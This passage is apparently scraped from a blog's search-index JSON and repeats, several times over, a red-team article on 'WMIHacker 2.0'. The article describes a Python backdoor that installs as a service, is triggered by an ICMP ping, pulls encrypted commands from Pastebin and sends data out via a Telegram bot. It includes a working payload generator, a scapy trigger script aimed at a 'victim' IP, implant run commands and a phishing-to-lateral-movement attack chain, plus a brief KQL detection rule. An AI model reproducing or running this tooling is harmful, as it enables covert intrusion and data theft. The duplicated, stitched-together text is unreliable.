monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script () sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 